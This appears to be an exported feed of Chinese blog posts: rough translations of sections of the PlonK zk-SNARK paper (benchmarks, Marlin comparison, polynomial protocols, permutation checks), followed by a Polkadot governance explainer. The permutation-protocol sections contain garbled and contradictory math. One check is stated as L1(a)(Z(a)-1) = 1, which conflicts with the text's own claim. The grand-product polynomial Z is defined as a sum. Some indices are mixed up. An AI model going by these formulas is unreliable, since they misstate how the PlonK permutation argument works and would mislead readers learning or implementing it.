<p>​    我们还注意到，PlonK的结构化参考字符串的程度等于电路中门的数量（如果使用PlonK的“快速”风味）。与现有技术相比，这极大地减少了SRS的大小。</p>
<p>​    在比较证明构造时，由于构造证明所需的快速傅立叶变换的数目是不平凡的，因此我们还包括PlonK的字段乘法次数。 所有其他简洁的通用SNARK结构也具有较高的FFT</p>
<p>如下Table 1: Prover comparison. m = number of wires, n = number of multiplication gates, a = number of addition gates</p>
<p><img src="/2021/04/02/Plonk-1-%E5%9F%BA%E4%BA%8E%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B9%98%E5%AD%90%E6%B3%95%E7%9A%84%E6%8E%92%E5%88%97%E4%BB%A5%E7%94%A8%E4%BA%8E%E9%80%9A%E7%94%A8%E7%9A%84%E9%9D%9E%E6%8E%A5%E8%A7%A6%E7%9A%84%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/1.png"></p>
<p>​    转换成本，但是由于很难找到硬数字，因此我们无法将其包括在上表中。定性分析表明，FFT消耗的计算时间比G1组指数的消耗少。 关于字段乘法次数的更多详细信息，请参见第1.3节。</p>
<p>​    每个证明的验证者计算如表2所示。由于提交的证明者多项式的结构简单，因此仅需要两个双线性配对操作。 此外，每个配对中的G2元素都是固定的，从而可以进行优化，从而将配对计算时间减少≈30％[CS10]。</p>
<p>Table 2: Verifier comparison per proof, P=pairing, `=num of pub inputs. For nonsuccinct protocols, additional helper work is specified</p>
<p><img src="/2021/04/02/Plonk-1-%E5%9F%BA%E4%BA%8E%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B9%98%E5%AD%90%E6%B3%95%E7%9A%84%E6%8E%92%E5%88%97%E4%BB%A5%E7%94%A8%E4%BA%8E%E9%80%9A%E7%94%A8%E7%9A%84%E9%9D%9E%E6%8E%A5%E8%A7%A6%E7%9A%84%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/2.png"></p>
<h4 id="1-3-Performance-and-Benchmarks"><a href="#1-3-Performance-and-Benchmarks" class="headerlink" title="1.3 Performance and Benchmarks"></a>1.3 Performance and Benchmarks</h4><p>Figure 1: Benchmarks for test PlonK circuits using the BN254 curve. Does not include witness generation. Tests performed on a Surface pro 6 with 16GB RAM and a core i7-8650U CPU, utilizing all 8 logical/4 physical cores.</p>
<p><img src="/2021/04/02/Plonk-1-%E5%9F%BA%E4%BA%8E%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B9%98%E5%AD%90%E6%B3%95%E7%9A%84%E6%8E%92%E5%88%97%E4%BB%A5%E7%94%A8%E4%BA%8E%E9%80%9A%E7%94%A8%E7%9A%84%E9%9D%9E%E6%8E%A5%E8%A7%A6%E7%9A%84%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/3.png"></p>
<p>​    上图 图1提供了一些构建和验证PlonK证明所需时间的估计。有问题的基准利用Barretenberg ecc库利用BN254椭圆曲线。即使对于门数超过一百万的电路，PlonK证明也能够在不超过23秒的时间内在消费级硬件上构建。这标志着通用SNARK效率的显着提高，这些SNARK现在可用于各种实际使用案例。</p>
<p>​    电路预处理是一次性的计算，对于每个编入PlonK电路的程序都需要进行。此步骤生成验证证明所需的“选择器”多项式的多项式承诺。</p>
<p>​    构造证明时，执行所需的FFT快速傅立叶变换所需的时间与椭圆曲线标量乘法所需的时间相当。表1中的场乘法数是从大小为4n的8个FFT，大小为2n的5个FFT和大小为n的12个FFT获得的。</p>
<p>​    如果提供电路的预处理多项式作为对单位的第4n个根（而不是基于拉格朗日的形式）的评估，则FFT变换的次数可以大大减少。但是，由于这大大增加了构造证明所需的信息量，因此我们在基准测试中忽略了这种优化。</p>
<p>​    我们以与相关并发工作的比较作为对导言的总结。</p>
<h4 id="1-4-与随机求和检查方法和Fractal-Marlin的比较"><a href="#1-4-与随机求和检查方法和Fractal-Marlin的比较" class="headerlink" title="1.4 与随机求和检查方法和Fractal / Marlin的比较"></a>1.4 与随机求和检查方法和Fractal / Marlin的比较</h4><p>​    粗略地说，所有简洁的证明系统都是通过使用随机性将许多约束检查压缩为一个来工作的。获得这种压缩的一般方法是采用约束的随机线性组合。在R1CS和类似系统的情况下，要压缩的更困难的约束是系统变量之间的线性关系，即形式为 &lt;ai，x&gt; = 0的约束，其中x∈F 是系统变量，而ai∈F 表示约束之一。这些类似于电路可满足性陈述中较为笼统的“接线约束”，其形式为xi = xj（例如，当xi表示门G的输出线，而xj表示输入线时，从G到另一个门G‘）。</p>
<p>线性约束的随机线性组合可能具有以下形式：<br>$$<br>\sum_{i\in [n]}{r^i&lt;a_i} , x&gt;=0<br>$$<br>对于均匀的r∈F。</p>
<p>​    跳过一些细节，[MBKM19]和随后的[Gab19]工作（依赖[BCR + 19]）减少了这种检查，从而可以在随机点上评估n次双变量S的程度；使得S中的非零单项式的数目对应于约束向量{ai}中非零项的数目。[MBKM19]在这一点上设计了一个聪明的策略，以在许多证明中分摊S的许多评估的成本。[MBKM19]的这种变体在证明者效率上要高得多，但由于需要验证者自己计算至少一个S评估，因此不能完全简洁。</p>
<p>因此，对于证明者更为有效的Sonic版本（以及[Gab19]的完全简洁版本）而言，完全简洁的障碍是一种仅在S仅包含S的情况下有效验证评估S(z，y)的方法。 O(n)非零单项式。</p>
<p>​    最近的并行分形和马林系统[CHM + 19，COS19]的重大技术贡献是“在拉格朗日基础上”解决此问题的方法。</p>
<p>​    具体来说，假设H，K是F的大小<code>O(n)</code>的乘法子组，使得S在 <code>H×K</code> 上仅具有M个非零值；然后[CHM + 19，COS19]设计了一个协议，以使简洁的验证者确信<code>S(z，y)= t</code>，证明者的工作在M中是线性的。这是一个很好的观点，指出自然而然地可以解决这个问题将[KZG10]推广到双变量多项式承诺方案将导致<code>O(n2)</code>证明时间。</p>
<p>​    回到PlonK上，我们不需要“双变量评估突破”的原因是，我们专注于恒定扇入电路，而不是R1CS /无限加法扇入； 因此，我们的线性约束只是布线约束，可以简化为置换检查（如第5.2、6节所述）。 一种解释[BG12]技术的方法是“与一般线性约束相比，可以更简单地组合与置换对应的线性约束”。 例如，在上述等式中，每个约束都乘以一个不同的随机系数，而在[BG12]随机化中，在一定意义上将相同的随机移位添加到每个变量值就足够了。（有关详细信息，请参见第5节中的置换协议。）</p>
<h5 id="与Marlin的具体比较。"><a href="#与Marlin的具体比较。" class="headerlink" title="与Marlin的具体比较。"></a>与Marlin的具体比较。</h5><p>​    尽管Fractal在透明递归SNARK的情况下利用了稀疏的双变量评估技术，但Marlin像本文中一样专注于构建完全简洁的（通用）SNARK。 </p>
<p>​    比较这项工作和[CHM + 19]并非完全简单，因为我们处于具体常量领域，并且两项工作使用的基本度量是不同的。 我们将主要参数n设为扇入式两个电路中的加法门和乘法门的数量； [CHM + 19]将描述R1CS的三个矩阵之一中的最大非零数用作其主要参数。对于相同的n值，PlonK胜过Marlin，例如，在证明者组操作和证明大小方面大约是原来的两倍。 在只有乘法门的电路的极端情况下，这确实代表了两个系统之间的性能差异。 </p>
<p>​    但是，在具有“频繁大量添加”的约束系统中，Marlin的性能可能优于PlonK当前指定的变体。例如，这发生在一个“完全密集”的R1CS约束的极端情况下：<br>$$<br>( \sum_{j \in [m]}{a_j x_j} ) \cdot ( \sum_{j \in [m]}{b_j x_j} ) = \sum_{j \in [m]}{c_j x_j}<br>$$<br>其中a，b，c∈F 具有所有非零条目。</p>
<p>​    此外，似乎分形中隐含的思想，或者将提及的稀疏二元评估协议“插入”到[Gab19]中，将通过此途径提高性能； 特别是在某些证明人工作可以委派给外部帮手的情况下（在PlonK中，这种委派的机会较少，因为检查证人本身的连线，而在[Gab19，CHM + 19，COS19]中,在某种意义上检查了验证者的随机系数）。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>Plonk-2-零知识证明的演进</title>
    <url>/2021/04/09/Plonk-2-%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E7%9A%84%E6%BC%94%E8%BF%9B/</url>
    <content><![CDATA[<p>论文原文 ==&gt; <a href="https://eprint.iacr.org/2019/953.pdf">953.pdf (iacr.org)</a>，<a href="https://eprint.iacr.org/2019/953.pdf">PlonK: Permutations over Lagrange-bases for Oecumenical Noninteractive arguments of Knowledge</a></p>
<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>利用可更新的通用结构化参考字符串的zk-SNARK构造消除了部署zk-SNARKs [GKM +]的主要障碍之一。 Maller等人的重要工作，[MBKM19]提出了Sonic-第一个具有实用性的zk-SNARK，具有完全简洁的验证，可用于带有这种SRS(structured reference string)的通用算术电路。但是，<a href="https://eprint.iacr.org/2019/601.pdf">支持完全简洁验证的Sonic版本</a>仍然需要相对较高的证明建造费用。 我们提出了一种具有完全简洁验证的通用SNARK结构，并且大大减少了证明方的运行时间（根据电路结构的不同，证明者的运行时间比完全简洁验证程序模式下的[MBKM19]少7.5-20倍）。与[MBKM19]类似，我们依赖于基于Bayer和Groth [BG12]的置换参数。但是，我们专注于“评估亚组而不是单项式系数”； 这样可以简化置换参数和算术化步骤。</p>
<h3 id="4-理想的低度协议"><a href="#4-理想的低度协议" class="headerlink" title="4.理想的低度协议"></a>4.理想的低度协议</h3><p>​    我们在证明者和验证者之间定义了一种有限类型的协议，以清晰地捕获和抽象多项式承诺方案（例如[KZG10]）。在Plonk协议中，证明者将低度的多项式发送给第三方 <strong><em>I</em></strong>。然后，验证者可以询问 <strong><em>I</em></strong> ，证明者的多项式与验证者已知的其他预定义多项式之间是否存在某些恒等式。</p>
<p><strong>定义 4.1.</strong> 定值正整数 <em>d, D, t, l</em> . A(<em>d, D, t, l</em>) 多项式协议，其中，证明者<strong>P</strong>poly，验证者<strong>V</strong>poly和受信方**<em>I**</em>之间存在多轮协议，其进行如下。</p>
<p>1.协议定义包括一组预处理多项式 g1, … , gl ∈ <strong><em>F</em></strong> <em>&lt;d</em>[<strong>X</strong>]。</p>
<p>2.<strong>P</strong>poly的消息被发送到 <strong><em>I</em></strong>，并且对于f∈ <strong><em>F</em></strong> <em>&lt;d</em>[<strong>X</strong>]，形式为f。 如果<strong>P</strong>poly发送的消息不是这种形式，则协议中止。</p>
<p>3.<strong>V</strong>poly到<strong>P</strong>poly的消息是任意的（但是我们将集中讨论公共硬币协议，其中消息只是随机的硬币）</p>
<p>4.在协议末尾，假设 f1, … , ft 是从<strong>P</strong>poly发送到 <strong><em>I</em></strong> 的多项式。<strong>V</strong>poly可能会问 <strong><em>I</em></strong> 在{f1, . . . , ft , g1, . . . , gl}之间是否存在某些多项式恒等式:<br>$$<br>F(X) := G(X,h_1(v_1(X)), … , h_M(v_M(X)))≡0<br>$$<br>其中，hi ∈  {f1, . . . , ft , g1, . . . , gl}，G ∈ <strong><em>F</em></strong> [X, X1, … , Xm], v1, … , vm ∈ <strong><em>F</em></strong> <em>&lt;d</em>[<strong>X</strong>]，此 F ∈ <strong><em>F</em></strong> <em>&lt;D</em>[<strong>X</strong>]中，任一 f1, . . . , ft 都是<strong>P</strong>poly按照本协议制作的。</p>
<p>5.在收到 <strong><em>I</em></strong> 的回答之后，如果所有身份均成立，则<strong>V</strong>poly输出 <strong>acc</strong>，否则输出 <strong>rej</strong>。</p>
<p><strong>结论 4.2.</strong>  一个更加复杂的模型，<strong>P</strong>poly发送消息(f, n) 至 <strong><em>I</em></strong>，其中 <em>n</em> <em>≤</em> d ，由 <strong><em>I</em></strong> 执行 f ∈ <strong><em>F</em></strong> &lt;n[<strong>X</strong>] 。但是，我们避免这样做，因为我们的协议不需要这种额外的功能，并且会导致效率降低，因为它转化为需要使用多项式承诺方案，并且能够动态实施小于d度的边界。</p>
<p>​    我们以自然的方式为关系定义多项式协议。</p>
<p><strong>定义 4.3.</strong> 给定关系<strong>R</strong>，<strong>R</strong>是具有以下属性的多项式协议。</p>
<p>1.协议的第一步，<strong>P</strong>poly和<strong>V</strong>poly都被给与一个输入 x。假设<strong>P</strong>poly拥有w，并且 (x, ω) ∈ <strong>R</strong>。</p>
<p>2.完整性(Completeness)：如果<strong>P</strong>poly正确地遵从协议，使用证明人 ω 生成 x，<strong>V</strong>poly将百分之百接受。</p>
<p>3.知识健全性(Knowledge Soundness)：存在一个有效的 <strong>E</strong> 即给定对<strong>P</strong>poly的消息的访问权，给到 <strong><em>I</em></strong> ，输出ω，使得对于<strong>P</strong>poly的任何策略，下列事件的概率为negl(λ)。</p>
<p>​    a.在协议的末尾，<strong>V</strong>poly输出<strong>acc</strong>，并且</p>
<p>​    b. (x, ω) ∉ <strong>R</strong>。</p>
<p><strong>结论 4.4.</strong> 我们故意不为理想的协议定义零知识属性，因为获得ZK取决于最终“编译”协议中泄漏给我的多项式的信息量。这又取决于用于编译的多项式承诺方案的具体细节。</p>
<h4 id="4-1范围上的多项式协议"><a href="#4-1范围上的多项式协议" class="headerlink" title="4.1范围上的多项式协议"></a>4.1范围上的多项式协议</h4><p>​    在我们的协议中，<strong>V</strong>poly 实际上需要检查某些多项式方程式是否在输入值的特定范围内成立，而不是作为多项式恒等式。首次启发，对于子集 <strong><em>S</em></strong> ⊂ <strong><em>F</em></strong> ，我们定义了一个**<em>S**</em>范围(<em>d, D, t, l</em>)的多项式协议，该协议与 a(<em>d, D, t, l</em>) 多项式协议相同，不同之处在于：验证者询问他的恒等式是否在S的所有点上都成立，而不是完全一样。然后，我们以与定义4.3中完全相同的方式为关系定义范围多项式协议。</p>
<p>​    我们表明，将范围协议转换为多项式协议只会产生一个额外的证明者多项式。</p>
<p><strong>引理4.5.</strong> 令P为R的范围S的(<em>d, D, t, l</em>)多项式协议。然后我们可以构造 a(<em>max{d, |S|, D−|S|}, D, t+1,  l+1</em>)，也就是R的多项式协议P∗。</p>
<p>本引理，我们使用以下简单声明。</p>
<p><strong>断言4.6.</strong> 定义 <em>F1,…,Fk</em> ∈ <strong><em>F</em></strong> &lt;n[<strong>X</strong>]。定义 <strong><em>Z</em></strong> ∈ <strong><em>F</em></strong> &lt;n[<strong>X</strong>]。假设部分 i ∈ [k]，Z ∉ <strong><em>Fi</em></strong>。则：</p>
<p>1.有一种可能性，1/|<strong><em>F</em></strong>| 之上存在a1,…,ak ∈ <strong><em>F</em></strong> ， Z 不属于 <strong><em>F</em></strong><br>$$<br>F := \sum ^k _{j=1} a_j \cdot F_j<br>$$<br>2.假设 Z 在 <strong><em>F</em></strong> 上分解为不同的线性因子，有一种可能，k/|<strong><em>F</em></strong>|之上存在a，a∈F，Z不属于 <strong><em>F</em></strong><br>$$<br>G:= \sum ^k _{j=1} a^ {j-1} \cdot F_j<br>$$<br><strong>证明.</strong> Z|F 等同于 (F mod Z)=0. 另有 R:= (<strong><em>Fi</em></strong> mod Z)， R ≠ 0，则R不为零二项式：<br>$$<br>F := \sum ^k _{j=1,j≠i} a_j \cdot F_j + a_i \cdot R(mod Z)<br>$$<br>因此，每一个特定的aj，最多有一个值 ai∈*<strong>F**<em>，该</em></strong>F*** mod Z = 0。第一点证明完毕。</p>
<p>为了证明第二，类似地写：<br>$$<br>G := \sum ^k _{j=1,j≠i} a^{j-1} \cdot F_j + a^{i-1} \cdot R(mod Z)<br>$$<br>令 x ∈ <strong><em>F</em></strong> ，使 Z(x)=0，但 R(x)≠0。则 G mod <em>Z</em> = 0，即 G(x)=0，推导出 a 是非零多项式的根。<br>$$<br>g(Y) := \sum ^k _{j=1,j≠i} Y^{j-1} \cdot F_j(x) + Y^{i-1} \cdot R(x)<br>$$<br>最多k个a值是这种情况。</p>
<p><strong>证明.</strong> (引理4.5.) 令P为范围S的(<em>d, D, t, l</em>)多项式协议。构建P*，同P一致，附加条件是 Zs(X) :=∏(X-a), a∈S。P* 的执行与P 一致，直到<strong>V</strong>poly在S域内请求恒等式。假设验证者请求 k 个恒等式：F1(X),…,Fk(X)，Fi的总维度的最大值是D，如定义4.1.所讲。P* 处理如下：</p>
<ul>
<li><p><strong>V</strong>poly发送队列a1,…,ak ∈ <strong><em>F</em></strong> 给到<strong>P</strong>poly。</p>
</li>
<li><p><strong>P</strong>poly计算二项式<br>$$<br>T:=\frac {\sum a_i \cdot F_i} {Z_S} ,i∈[k]<br>$$</p>
</li>
<li><p><strong>P</strong>poly发送 T 给到 <strong><em>I</em></strong></p>
</li>
<li><p><strong>V</strong>poly查询恒等式</p>
</li>
</ul>
<p>$$<br>\sum _{i∈[k]} a_j \cdot F_i(X) ≡ T \cdot Z_S<br>$$</p>
<p>遵循断言4.6，即有一种可能性，1/|<strong><em>F</em></strong>| 基于<strong>V</strong>poly的选择的a1,…,ak之上，适当的 T∈F[X]等同于<em>F1,…,Fk</em>，消失于范围S之中。这等效于<strong>V</strong>poly在P的类似执行中输出acc。</p>
<h4 id="4-2从多项式协议到代数协议。"><a href="#4-2从多项式协议到代数协议。" class="headerlink" title="4.2从多项式协议到代数协议。"></a>4.2从多项式协议到代数协议。</h4><p>​    <a href="https://books.google.co.jp/books?id=ce7gDwAAQBAJ&pg=PA97&lpg=PA97&dq=algebraic+adversary&source=bl&ots=7UqZAMlvRT&sig=ACfU3U1wBeYP14ZjOWj_RSZVmRLuwj9OQA&hl=en&sa=X&ved=2ahUKEwjbrbG7ofrvAhXOE4gKHT8fAwQQ6AEwBHoECAQQAw#v=onepage&q=algebraic%20adversary&f=false">离散对数甚至许多Diffie-Hellman式的问题都很困难。因此，打破具体小组中这种普遍困难的假设的唯一方法是以非平凡的方式使用基础小组表示形式。基于此，GGM(generic group model)可以非常有用地进行完整性检查，以验证给定假设的有效性，甚至可以保证给定密码方案的安全性。但是，GGM无法实施：GGM中存在安全的加密方案，但是在与任何具体组实例化时都不安全。</a></p>
<p>​    AGM(algebraic group model)只考虑代数对象。一个代数对象A可以任意使用群组中的元素，但是必须根据输入组元素对其输出组元素中的任何一个提供显式分解，即A还必须输出一个解释，说明如何使用组操作从其输入中计算其输出中的任何组元素。</p>
<p>​    我们希望使用Section 3的多项式承诺方案，将一个多项式协议编译成在代数组模型中具有知识健全性的协议（在第2.2节中定义）。</p>
<p>​    具体证明略。</p>
<p><strong>减少字段元素的数量</strong> ：我们描述了Mary Maller进行的优化，以减少来自M的证明中的*<strong>F*<strong>元素的数量。我们从一个说明性示例开始。假设</strong>V*<em>希望检查恒等式h1(X)·h2(X)-h3(X)≡0。上述编译将使P以随机x∈</em></strong>F*<strong>方式发送h1，h2，h3。</strong>V**将检查h1(x)h2(x)-h3(x)=0。因此，P发送了三个字段元素。</p>
<p>​    但是请注意，我们可以让P只发送c:= h1(x)，然后在开放协议中简单地验证多项式L(X):=c·h2(X)-h3(X)是否在x处为零。请注意，我们可以计算com(L)= c·com(h2)-com(h3)</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>Plonk-3-用于识别排列的多项式协议</title>
    <url>/2021/04/13/Plonk-3-%E7%94%A8%E4%BA%8E%E8%AF%86%E5%88%AB%E6%8E%92%E5%88%97%E7%9A%84%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>论文原文 ==&gt; <a href="https://eprint.iacr.org/2019/953.pdf">953.pdf (iacr.org)</a>，<a href="https://eprint.iacr.org/2019/953.pdf">PlonK: Permutations over Lagrange-bases for Oecumenical Noninteractive arguments of Knowledge</a></p>
<h3 id="5-用于识别排列的多项式协议"><a href="#5-用于识别排列的多项式协议" class="headerlink" title="5.用于识别排列的多项式协议"></a>5.用于识别排列的多项式协议</h3><p>​    从根本上说，我们的通用SNARK是“排列检查”，其灵感来自于Bayer和Groth [[BG12](S. Bayer and J. Groth. Effiffifficient zero-knowledge argument for correctness of a shufflfflffle. In *Advances in Cryptology - EUROCRYPT 2012 - 31st Annual* *International Conference on the Theory and Applications of Cryptographic* *Techniques, Cambridge, UK, April 15-19, 2012. Proceedings*, pages 263–280, 2012.)]及其在[[BCC+16](J.Bootle, A. Cerulli, P. Chaidos, J. Groth, and C. Petit. Effiffifficient zero knowledge arguments for arithmetic circuits in the discrete log setting. pages 327–357, 2016.)，[MBKM19](M. Maller, S. Bowe, M. Kohlweiss, and S. Meiklejohn. Sonic: Zero-knowledge snarks from linear-size universal and updateable structured ref-erence strings. *IACR Cryptology ePrint Archive*, 2019:99, 2019.)]中的变体所提出的排列参数。同样，与[[MBKM19](M. Maller, S. Bowe, M. Kohlweiss, and S. Meiklejohn. Sonic: Zero-knowledge snarks from linear-size universal and updateable structured ref-erence strings. *IACR Cryptology ePrint Archive*, 2019:99, 2019.)]相比，我们的主要优点是可以通过处理单变量多项式和可乘子组来获得更简单的协议。</p>
<p>​    <strong>维度界限：</strong>我们使用两个整数参数n≤d。直观地讲，n是诚实证明者多项式的度，d是我们实际上对恶意证明者强制执行的范围。因此，我们在分析证明者效率并描述“正式”协议输入时假设度数为n。但是在分析稳健性时允许度数为d。</p>
<p>​    我们假设存在生成器 <strong>g</strong> 的n阶乘子子集H⊂**<em>F**</em>。</p>
<p>​    指定 i∈[n]，Li(X) 为**<em>F**</em> &lt;n[<strong>X</strong>]的一个元素，Li(<strong>g</strong>)=1且Li(a)=0，其中a∈<strong>H</strong> 与 <strong>g</strong>不同，例如，{Li}，其中 i∈[n] 是 <strong>H</strong>的拉格朗日基础。</p>
<p>​    {Li} 可以”将点检查减少到范围检查“。</p>
<p><strong>断言5.1.</strong> 给定i∈[n]和Z，Z*∈**<em>F**</em>[X]。 则针对每一个a∈<strong>H</strong>，有且只有Z(gi) = Z*(gi)时 Li(a)(Z(a) - Z*(a)) = 0。</p>
<p>​    给定f，g∈**<em>F**</em>[X]和一个排列 σ：[n]→[n]，写为 g=σ(f)，针对每一个a∈<strong>H</strong>，g(<strong>g</strong>i) = f(<strong>g</strong>σ(i))</p>
<p>​    我们提出了一个范围多项式协议，使<strong>P</strong>poly能够证明 g=σ(f)。</p>
<p><strong>预处理多项式</strong>：多项式为 SID∈*<strong>F**<em>[X]，SID由S(gi)=i定义，对于每一个i∈[n]且Sσ∈</em></strong>F*<strong>[X]，Sσ(**g</strong>i) = σ(i)。</p>
<p>输入：f，g∈**<em>F**</em>&lt;n[X]</p>
<p><strong>协议：</strong></p>
<p>1.<strong>V</strong>poly选择随机数β，γ∈**<em>F**</em>，并发送给到<strong>P</strong>poly。</p>
<p>2.令 f’:=f+β·SID+γ，g’:=g+β·Sσ+γ。则，针对i∈[n]，有<br>$$<br>f’(g^i) = f(g^i) + β \cdot i + γ, g’(g^i)=g(g^i) + β \cdot σ(i) + γ<br>$$<br>3.<strong>P</strong>poly计算 <strong><em>Z</em></strong> ∈ <strong><em>F</em></strong> &lt;n[<strong>X</strong>]，且**<em>Z**</em>(g)=1；并且对于 i∈{2,…,n}<br>$$<br>Z(g^i)=\sum _{1 \leq j \leq i} f’(g^j)/g’(g^j)<br>$$<br>如果某元素未定义，在γ之上会发生的可能性为negl(λ)，协议则中止。</p>
<p>4.<strong>P</strong>poly发送*<strong>Z***给到第三方 *</strong>I***。</p>
<p>5.<strong>V</strong>poly检验a，其中a∈<strong>H</strong>。</p>
<p>​    (a) L1(a)(Z(a)-1) = 1</p>
<p>​    (b) Z(a)f’(a) = g’(a)Z(a·g)</p>
<p>如果上述检验OK，则输出<strong>acc</strong>。</p>
<h4 id="5-1检查“扩展”排列"><a href="#5-1检查“扩展”排列" class="headerlink" title="5.1检查“扩展”排列"></a>5.1检查“扩展”排列</h4><p><strong>预处理多项式</strong>：多项式为 SID1,…,SIDk∈**<em>F**</em>&lt;n[X]，SIDj由SID(gi)=(j-1)·n + i定义，对于每一个i∈[n]。</p>
<p>输入：f1,…,fk，g1,…,gk∈**<em>F**</em>&lt;n[X]</p>
<p><strong>协议：</strong></p>
<p>1.<strong>V</strong>poly选择随机数β，γ∈**<em>F**</em>，并发送给到<strong>P</strong>poly。</p>
<p>2.令 fj’:=fj+β·SIDj+γ，gj’:=gj+β·Sσj+γ。则，针对j∈[k]，i∈[n]，有<br>$$<br>f’ _j (g^i) = f _j (g^i) + β \cdot ((j-1) \cdot n + i) + γ, g_j’(g^i)=g_j(g^i) + β \cdot σ((j-1) \cdot n + i) + γ<br>$$<br>3.定义 f’，g‘∈*<strong>F*<strong>&lt;kn[X]如下：<br>$$<br>f’(X) := \prod _{j \isin [k]} f_j’(X),g’(X) := \prod _{j \isin [k]} g_j’(X)<br>$$<br>4.**P</strong>poly计算 *</strong>Z*** ∈ <strong><em>F</em></strong> &lt;n[<strong>X</strong>]，且*<strong>Z*<strong>(g)=1；并且对于 i∈{2,…,n}<br>$$<br>Z(g^i)=\sum _{1 \leq l \leq i} f’(g^j)/g’(g^j)<br>$$<br>5.**P</strong>poly发送*</strong>Z*<strong>给到第三方 **<em>I</em></strong>。</p>
<p>5.<strong>V</strong>poly检验全部a，其中a∈<strong>H</strong>。</p>
<p>​    (a) L1(a)(Z(a)-1) = 1</p>
<p>​    (b) Z(a)f’(a) = g’(a)Z(a·g)</p>
<p>如果上述检验OK，则输出<strong>acc</strong>。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>Polkadot链上治理机制浅析</title>
    <url>/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<p>Polkadot的治理分为三个阶段，分别为<strong>提案</strong>、<strong>投票</strong>、<strong>计票阶段</strong>。</p>
<p>线上链接 ==&gt; <a href="https://polkadot.js.org/apps/?rpc=wss://kusama-rpc.polkadot.io#/democracy">https://polkadot.js.org/apps/?rpc=wss%3A%2F%2Fkusama-rpc.polkadot.io#/democracy</a></p>
<h3 id="提案阶段"><a href="#提案阶段" class="headerlink" title="提案阶段"></a>提案阶段</h3><p>可以通过以下几种方式启动提案：</p>
<ol>
<li>由DOT持有人提交的公开提案。任何DOT持有人都可以通过抵押最少数量的DOT来提交公开提案，支持该提案的人需要抵押相同数量的DOT以认可该提案。公开提案存储在队列中，按照抵押的DOT数量进行排序，抵押的DOT数最多的提案会定期提交投票阶段。进入投票阶段后，抵押的DOT将被返还给持有人；</li>
<li>理事会提交的理事会提案。理事会提交的提案也存储在队列中，理事会全员同意一个提案或者大多数理事会成员同意一个提案时，该提案便可以提交到投票阶段；</li>
<li>作为前序公投执行的一部分而提交的提案；</li>
<li>技术委员会提交的紧急提案。一般是Polkadot网络出现了bug，需要紧急修复而提交的紧急提案。</li>
</ol>
<h3 id="投票阶段"><a href="#投票阶段" class="headerlink" title="投票阶段"></a>投票阶段</h3><p>每隔 28天，将会有一个提案进行定期全民投票。</p>
<p>这个提案来自DOT持有人提交的公共提案队列或者理事会提交的提案队列，在两个队列之间交替进行。</p>
<p>比如这一次的提案来自DOT持有人提交的公共提案队列，28天以后的下一个投票阶段，提案便是来自理事会提交的提案队列。一般情况下同一时间段内只能进行一个投票，除非有紧急提案，紧急提案可以与定期投票同时举行。</p>
<p>从投票结束到实施更改之间的时间称为执行延迟期。对于启动投票的前两种方式，该时间固定为 28 天。对于第三种方式，可以根据需要进行设置。紧急提案会有一个较短的执行时间。</p>
<p>投票者可以投赞成或反对票，或者放弃投票。投票者如果要对公共提案进行投票，需要锁定一定数量的DOT，并且通常至少要锁定至在公投票结束后的执行延迟期内。</p>
<p>投票的权重由锁定的DOT数量和锁定时间决定，因此，即使你拥有较少的DOT，但是如果锁定时间足够长，也可能拥有相对将高的权重；相反的，如果锁定时间很短，即便锁定了较多DOT，权重也不一定较高。</p>
<p>采用这种机制是为了确保需要最小限度的经济投入并防止卖票行为，同时确保了长期致力于该制度的投票者有更大的发言权。</p>
<h3 id="计票阶段"><a href="#计票阶段" class="headerlink" title="计票阶段"></a>计票阶段</h3><p>根据不同的实体提出的议案，以及是否所有理事会成员都投票赞成，Polkadot提供了三种不同的计票方案。</p>
<p>如下所示：</p>
<table>
<thead>
<tr>
<th>实体</th>
<th>计票方案</th>
</tr>
</thead>
<tbody><tr>
<td>公开提案</td>
<td>正投票率偏差</td>
</tr>
<tr>
<td>理事会（全票赞成）</td>
<td>负投票率偏差</td>
</tr>
<tr>
<td>理事会（多数赞成）</td>
<td>简单多数制</td>
</tr>
</tbody></table>
<p>下面来解释一下这三种方案。首先，定义四个术语：</p>
<table>
<thead>
<tr>
<th>术语</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>approve</td>
<td>赞成票数</td>
</tr>
<tr>
<td>against</td>
<td>反对票数</td>
</tr>
<tr>
<td>turnout</td>
<td>投票的代币总数</td>
</tr>
<tr>
<td>electorate</td>
<td>网络中的DOT发行总数</td>
</tr>
</tbody></table>
<p><strong>▲ 正投票率偏差</strong></p>
<p>该方案使用以下公式来表示，只有当不等式成立的时候，投票才通过。可以看到，在投票的代币总数较少的时候，需要得到绝大多数的赞成票数才能通过投票；当投票的代币总数越来越多，直至接近网络中的DOT发行总数时，赞成总数只需要超过半数就可以投票通过，此时演变成了简单多数制方案（见下文）。</p>
<p><img src="/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/1.png"></p>
<p><strong>▲ 负投票率偏差</strong></p>
<p>该方案使用以下公式表示，该方案和上面的正投票率偏差正好相反：当投票的代币总数较少时，仅需要少量的赞成票数即可通过投票；当投票的代币总数达到网络中的DOT发行总数时，需要超过半数才能通过投票，此时也演变成了简单多数制方案。</p>
<p><img src="/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/2.png"></p>
<p>▲ 该方案用以下公式表示，该方案显而易见，即为简单的少数服从多数思想。</p>
